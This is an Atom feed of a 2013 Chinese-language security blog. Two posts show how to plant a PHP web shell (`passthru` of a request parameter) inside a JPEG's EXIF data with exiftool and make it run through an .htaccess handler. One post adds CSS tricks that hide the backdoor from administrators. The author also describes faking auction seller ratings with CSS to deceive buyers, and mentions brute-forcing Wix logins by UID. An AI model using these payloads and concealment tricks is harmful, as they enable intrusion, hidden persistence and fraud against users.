<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Security | atdog's Blog]]></title>
  <link href="http://blog.atdog.org/blog/categories/security/atom.xml" rel="self"/>
  <link href="http://blog.atdog.org/"/>
  <updated>2013-07-27T10:53:51+08:00</updated>
  <id>http://blog.atdog.org/</id>
  <author>
    <name><![CDATA[atdog]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[PHP Code Injection]]></title>
    <link href="http://blog.atdog.org/blog/2013/05/11/php-code-injection/"/>
    <updated>2013-05-11T10:50:00+08:00</updated>
    <id>http://blog.atdog.org/blog/2013/05/11/php-code-injection</id>
    <content type="html"><![CDATA[<p>先前提到的 <a href="/blog/2013/02/27/image-exif-tool/">Exiftool</a> 可以用來修改Image Metadata Tag的資料。</p>

<p>但當網頁加入 .htaccess</p>

<pre><code>AddHandler  application/x-httpd-php .jpg
</code></pre>

<p>會導致讀取 http://target/image.jpg 以html/txt去讀取，</p>

<p>雖然因此能正確執行php，不過要是有其他使用者/管理者來檢查，</p>

<p>發現讀取 http://target/image.jpg 都是亂碼，不就漏餡了嘛？</p>

<p>如圖</p>

<p><img src="/images/imageup1.png" title="image upload" alt="image upload" /></p>

<p>所以就想了個trick來掩蓋這個問題，</p>

<p>透過html css，將亂碼字設成透明，並加入&lt;img&gt;tag來讓圖片「看起來」是正常的</p>

<pre><code>exiftool -DocumentName='&lt;?php if(!isset($_POST[cmd])) {echo "&lt;body style=\"color:rgba(0,0,0,0)\"&gt;&lt;img style=\"position:absolute;top:0;left:0;\" src=\"http://image.url\"/&gt;&lt;/body&gt;";}else{passthru($_POST[cmd]);} __halt_compiler();?&gt;' apple.jpg
</code></pre>

<p>當中的PHP  code是這樣子的，</p>

<pre><code>&lt;?php 
    if(!isset($_POST[cmd])) {
        echo "&lt;body style=\"color:rgba(0,0,0,0)\"&gt;"
        echo "&lt;img style=\"position:absolute;top:0;left:0;\" src=\"http://image.url\"/&gt;&lt;/body&gt;";
    }else{
        passthru($_POST[cmd]);
    } 
    __halt_compiler();
?&gt;
</code></pre>

<p>若直接瀏覽圖片網址，如圖，會顯示出一個圖片</p>

<p><img src="/images/phpinject1.png" title="phpinjectimage" alt="phpinject1" /></p>

<p>只有當 POST cmd=XX 到頁面上時，才會正確執行passthru($cmd)！</p>

<p><img src="/images/phpinject2.png" title="phpinjectimage" alt="phpinject2" /></p>

<hr />

<p>其實這個想法就跟淘寶前陣子很多人在用的漏洞一樣，</p>

<p>使用者可以自定義CSS，而導致透過CSS來假造賣家評價，來騙取使用者，</p>

<p>前陣子我和<a href="http://blog.dm4.tw">dm4</a> 在Yahoo 拍賣也透過一樣的手法，</p>

<p>來做過評價的偽裝，雖然簡單但可以騙取到不少使用者的信任。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Image exif tool]]></title>
    <link href="http://blog.atdog.org/blog/2013/02/27/image-exif-tool/"/>
    <updated>2013-02-27T15:58:00+08:00</updated>
    <id>http://blog.atdog.org/blog/2013/02/27/image-exif-tool</id>
    <content type="html"><![CDATA[<p>最近在網路上找Image exif的修改工具 for Mac，</p>

<p>最後找到 <a href="http://www.sno.phy.queensu.ca/~phil/exiftool/">ExifTool</a></p>

<p>不過，為什麼要找Exif的修改工具呢？</p>

<p>其實是在看到<a href="http://blog.orange.tw">Orange</a>在Web Conf所講的<a href="http://www.slideshare.net/p8361/webconf-2013best-practices-the-upload">Talk</a>後才想找的，</p>

<p>安裝完 <a href="http://www.sno.phy.queensu.ca/~phil/exiftool/">ExifTool</a> 之後，</p>

<p>1.觀看圖片的Exif資訊</p>

<pre><code>$ exiftool test.jpg
</code></pre>

<p>2.修改圖片的Exif資訊，e.g., Document Name</p>

<pre><code>$ exiftool exiftool -documentname='&lt;?php passthru($_GET[cmd]); __halt_compiler();?&gt;' test.jpg
$ file test.jpg
./test.jpg JPEG: image data, JFIF standard 1.01
</code></pre>

<p>大概是像上面這樣，</p>

<p>所以我們可以透過上傳test.jpg 以及 .htaccess</p>

<pre><code>$ cat .htaccess
addhandler application/x-httpd-php .jpg
</code></pre>

<p>這是為了做什麼？</p>

<p>上傳後執行可以看到這樣的畫面</p>

<p><img src="/images/imageup1.png" title="image upload" alt="image upload" /></p>

<br>


<p><img src="/images/imageup2.png" title="image upload" alt="image upload" /></p>

<p>其實就是個小後門!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Wix.com]]></title>
    <link href="http://blog.atdog.org/blog/2013/02/27/wix-dot-com/"/>
    <updated>2013-02-27T12:41:00+08:00</updated>
    <id>http://blog.atdog.org/blog/2013/02/27/wix-dot-com</id>
    <content type="html"><![CDATA[<p><a href="http://www.wix.com">Wix.com</a> 最近似乎在Facebook竄紅起來，</p>

<p><img src="/images/wixcom.png" title="Wix com" alt="wixcom" /></p>

<p>Wix主打提供使用者快速建立web site的功能，</p>

<p>使用者僅需要用滑鼠做些基本的操作、或是會點flash，而不需有任何HTML的腦袋，</p>

<p>就可以完成一樣不錯的作品，</p>

<p>不過這邊要跟大家介紹一些Wix.com的小秘密，</p>

<p>由於過度依賴這類網站很容易導致資安問題，</p>

<hr />

<p>現在的網路世界中，為了方便性，這樣的網站實在不少，</p>

<p>以<a href="http://www.wix.com">Wix.com</a> 來說，</p>

<p><code>26,756,521 sites created!</code></p>

<p>從建立至今由使用者所建立的網站個數，</p>

<p>雖然使用者建立的網站，以靜態網頁為主，</p>

<p>不太會被攻擊者攻擊，大不了就DDOS，被攻擊過後，網站本身依舊活的好好的，</p>

<p>反之，假設攻擊者攻陷的是<a href="http://www.wix.com">Wix.com</a> ，</p>

<p>26,756,521個Sites就是死的。</p>

<hr />

<br>


<p>最後如下...</p>

<p><img src="/images/wix-backdoor.png" title="Wix backdoor" alt="wixbackdoor" /></p>

<p>你確定你的Host端(Wix.com)，Security做的足夠嘛？</p>

<hr />

<br>


<p>題外話，</p>

<p>如果大家想知道一個網站是不是由Wix所建立，</p>

<p>很簡單，</p>

<p>在HTML原始碼中，可以看到Wix.com的js、images的link，</p>

<p>甚至該Site的Wix.com的UID都可以在裡面找到，</p>

<p>(有UID就可以做login bruteforce，甚至能做Cookie的偽造)</p>

<p>這樣就可以快速的找到該Wix.com的使用者相關訊息了!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[第七屆資安技能金盾獎-心得文]]></title>
    <link href="http://blog.atdog.org/blog/2013/01/02/di-qi-jie-zi-an-ji-neng-jin-dun-jiang-xin-de-wen/"/>
    <updated>2013-01-02T13:22:00+08:00</updated>
    <id>http://blog.atdog.org/blog/2013/01/02/di-qi-jie-zi-an-ji-neng-jin-dun-jiang-xin-de-wen</id>
    <content type="html"><![CDATA[<p>金盾獎</p>

<p>對於剛加入資安領域的同學應該不陌生吧？</p>

<p>免費的麥當勞吃到飽，</p>

<p><img src="/images/McDownalds.jpg" title="McDownalds" alt="麥當勞山" /></p>

<p>出賽的抽獎獎品，</p>

<p>曾經的燦坤禮卷，</p>

<p>到這屆的Sogo禮卷，</p>

<p>欸，最重要的是不收報名費、還送參加獎！</p>

<p>也很感謝資策會對資訊安全的注重，才能給我們這樣子的舞台。</p>

<hr />

<p>到2012年已經是<a href="http://is.w18.noonspace.tw/">第七屆</a>了，</p>

<p>想想也參加了四屆倒是第一次Po心得文，</p>

<p>從最一開始的戰友 <a href="http://www.plurk.com/Jeffoo">Jeffxx</a>，到今年的戰友 <a href="http://blog.dm4.tw">dm4</a></p>

<p>只能說我的戰友們太給力 XD~</p>

<p>初賽部分就不多說了，大家上網應該都可以找到一些相關的考題內容，</p>

<p>結束前30分鐘排名...</p>

<p><img src="http://4.bp.blogspot.com/-Z6PAlz1rH6I/UNUwYUhVCoI/AAAAAAAAAWw/uygzrMAG_8c/s1600/R0021755.JPG" alt="rank" /></p>

<hr />

<p>這次的複賽依舊在恆逸資訊教育訓練中心，</p>

<p>五台電腦，一台輸入Key、三台看題目、一台提供對外網路</p>

<p>我們的策略很簡單，因為其中一位隊員出國了，</p>

<p>所以選擇先放棄所有binary的題目，把其他web、android、misc解玩再說，</p>

<p>題目和解題方式我想在網路上很容易可以找到</p>

<p>所以就不多說囉...</p>

<p>最後的成績 Team 430 - 第三名</p>

<p>第一名不意外是Orange他們</p>

<p>感謝<a href="http://blog.dm4.tw">dm4</a> XD</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[sql injection]]></title>
    <link href="http://blog.atdog.org/blog/2012/12/27/sql-injection/"/>
    <updated>2012-12-27T15:05:00+08:00</updated>
    <id>http://blog.atdog.org/blog/2012/12/27/sql-injection</id>
    <content type="html"><![CDATA[<p>There is the slide about sql injection that I presented with <a href="http://blog.dm4.tw">dm4</a> at the yahoo office.</p>

<p><a href="https://www.dropbox.com/s/w1zyzkhofnzqfzh/sql-pure.pdf">SQL injection cheatsheet</a></p>
]]></content>
  </entry>
  
</feed>
